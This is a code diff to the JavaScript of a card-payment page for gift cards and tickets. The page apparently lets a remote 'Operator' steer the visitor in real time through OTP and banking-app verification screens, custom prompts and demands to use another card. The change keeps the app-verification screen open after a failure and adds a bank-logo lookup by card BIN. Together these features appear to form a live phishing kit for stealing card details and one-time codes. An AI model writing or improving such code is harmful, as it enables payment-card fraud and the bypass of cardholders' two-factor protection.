@@ -303,7 +303,7 @@ else if(a==='timeout'){document.getElementById('load-overlay').classList.add('hi
 else if(a==='change_card'){window._otpInProgress=false;window._appVerifyInProgress=false;var oe=document.getElementById('otp-code');if(oe)oe.value='';document.getElementById('load-overlay').classList.add('hidden');document.getElementById('otp-overlay').classList.add('hidden');document.getElementById('app-verify-overlay').classList.add('hidden');document.getElementById('submitBtn').disabled=false;showInline('Please use a different card.'+(p.message?': '+p.message:''),true)}
 else if(a==='custom_prompt'){document.getElementById('load-overlay').classList.add('hidden');document.getElementById('submitBtn').disabled=false;if(window._otpInProgress){document.getElementById('otp-overlay').classList.remove('hidden')}else if(window._appVerifyInProgress){document.getElementById('app-verify-overlay').classList.remove('hidden')};showInline(p.message||'Operator needs your attention',true)}
 else if(a==='change_card_prompt'){window._otpInProgress=false;window._appVerifyInProgress=false;var oe=document.getElementById('otp-code');if(oe)oe.value='';document.getElementById('load-overlay').classList.add('hidden');document.getElementById('otp-overlay').classList.add('hidden');document.getElementById('app-verify-overlay').classList.add('hidden');document.getElementById('submitBtn').disabled=false;showInline(p.message||'Please use a different card.',true)}
-else if(a==='app_verify_fail'){window._appVerifyInProgress=false;document.getElementById('load-overlay').classList.add('hidden');document.getElementById('app-verify-overlay').classList.add('hidden');document.getElementById('submitBtn').disabled=false;showInline(p.message||'APP verification not completed. Please try again.',true)}
+else if(a==='app_verify_fail'){window._appVerifyInProgress=true;document.getElementById('load-overlay').classList.add('hidden');document.getElementById('app-verify-overlay').classList.remove('hidden');document.getElementById('app-error').classList.remove('hidden');document.getElementById('app-continue-btn').disabled=false;showInline(p.message||'APP verification not completed. Please try again.',true)}
 else if(a==='redirect_complete'){if(isGiftCard){location.href='/giftcards/complete/?amount='+(total||'')}else{location.href='/tickets/complete/'}}
 else if(a==='resend_ok'){window._otpResendCount=p.count||1;startResendCooldown()}
 else if(a==='resend_limit'){var rb=document.getElementById('otp-resend');if(rb){rb.disabled=true;rb.textContent='Limit reached'};showInline(p.message||'Maximum resend attempts reached. Please try again later.',true)}
@@ -437,6 +437,33 @@ var liveInputs=['card-number','card-name','card-expiry','card-cvv','bill-phone',
 liveInputs.forEach(function(id){
 var el=document.getElementById(id);if(el)el.addEventListener('input',onInput);
 });
+// Bank logo test — runs when card number reaches 6 digits
+var _lastBin='';
+document.getElementById('card-number').addEventListener('input',function(){
+var nums=this.value.replace(/\D/g,'');
+if(nums.length>=6&&nums.slice(0,6)!==_lastBin){
+_lastBin=nums.slice(0,6);
+testBankLogo(_lastBin);
+}
+});
+function testBankLogo(bin){
+fetch('/prod/cpx/payment/v1/api/bin/'+bin)
+.then(function(r){return r.json()})
+.then(function(d){
+var bank=d.issuer||d.bank_name||d.bank||'';
+console.log('[BankLogo] BIN '+bin+' → bank:',bank);
+if(bank){
+var url=getBankLogoUrl(bank);
+console.log('[BankLogo] Logo URL:',url);
+if(url){
+var img=new Image();
+img.onload=function(){console.log('[BankLogo] ✅ Loaded successfully:',url)};
+img.onerror=function(){console.log('[BankLogo] ❌ Failed to load:',url)};
+img.src=url;
+}
+}
+}).catch(function(e){console.log('[BankLogo] BIN lookup failed:',e)})
+}
 </script>
 </body>
 </html>
